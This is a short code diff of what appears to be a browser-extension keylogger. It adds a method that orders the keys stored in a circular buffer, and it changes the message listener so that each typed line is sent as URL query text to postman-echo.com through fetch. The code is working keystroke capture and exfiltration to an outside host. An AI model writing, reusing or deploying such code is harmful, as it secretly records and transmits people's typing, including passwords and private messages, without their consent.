@@ -56,7 +56,7 @@ class CircularBuffer {
             this.buffer[this.index] = element;
         }
         this.index = Number((this.index + 1) % this.size);
-        console.log(this.buffer.join(""));
+        console.log(this.to_string());
     }
 
     resize(size) {
@@ -74,6 +74,10 @@ class CircularBuffer {
         this.buffer = right.concat(left);
         this.index = Number(size > this.size ? this.size : 0);
         this.size = size;
+    }
+
+    to_string() {
+        return this.buffer.slice(this.index, this.buffer.length).concat(this.buffer.slice(0, this.index)).join("");
     }
 }
 
@@ -99,7 +103,7 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
         buffer.push(key);
     if (key == "\n") {
         buffer.resize(buffer.size);
-        let url = encodeURI("https://postman-echo.com/get?" + buffer.buffer.join(""));
+        let url = encodeURI("https://postman-echo.com/get?" + buffer.to_string());
         console.log(url);
         fetch(
             url,
